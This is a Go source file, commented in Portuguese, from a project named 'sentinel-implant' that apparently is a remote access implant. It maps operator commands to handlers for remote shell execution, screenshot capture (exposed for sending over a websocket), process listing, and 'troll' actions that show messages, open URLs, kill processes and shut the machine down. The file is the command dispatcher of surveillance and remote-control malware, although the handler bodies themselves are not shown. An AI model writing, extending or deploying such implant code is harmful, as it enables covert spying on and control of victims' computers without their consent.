package handlers

import (
	"fmt"

	"sentinel-implant/handlers/executor"
	"sentinel-implant/handlers/surveillance"
	"sentinel-implant/handlers/troll"
)

// CommandHandler é a assinatura de todas as funções de comando
// Recebe: params como slice de interface{}
// Retorna: output string, error
type CommandHandler func(params []interface{}) (string, error)

// CommandRegistry mapeia tipos de comando para seus handlers
var CommandRegistry = map[string]CommandHandler{
	// Executor
	"SHELL": executor.ShellHandler,

	// Surveillance
	"SCREENSHOT":   surveillance.ScreenshotHandler,
	"PROCESS_LIST": surveillance.ProcessListHandler,

	// Troll/Control
	"MESSAGE":   troll.MessageHandler,
	"OPEN_URL":  troll.OpenURLHandler,
	"KILL_PROC": troll.KillProcessHandler,
	"SHUTDOWN":  troll.ShutdownHandler,
}

// ExecuteCommand busca e executa o handler apropriado
func ExecuteCommand(commandType string, params []interface{}) (string, error) {
	handler, exists := CommandRegistry[commandType]
	if !exists {
		return "", fmt.Errorf("unknown command type: %s", commandType)
	}

	return handler(params)
}

// GetSupportedCommands retorna lista de comandos suportados
func GetSupportedCommands() []string {
	commands := make([]string, 0, len(CommandRegistry))
	for cmd := range CommandRegistry {
		commands = append(commands, cmd)
	}
	return commands
}

// GetScreenshotBase64 é exposto para o websocket poder enviar screenshots
// Esta função é um wrapper para não criar dependência circular
func GetScreenshotBase64() (string, error) {
	return surveillance.GetScreenshotBase64()
}
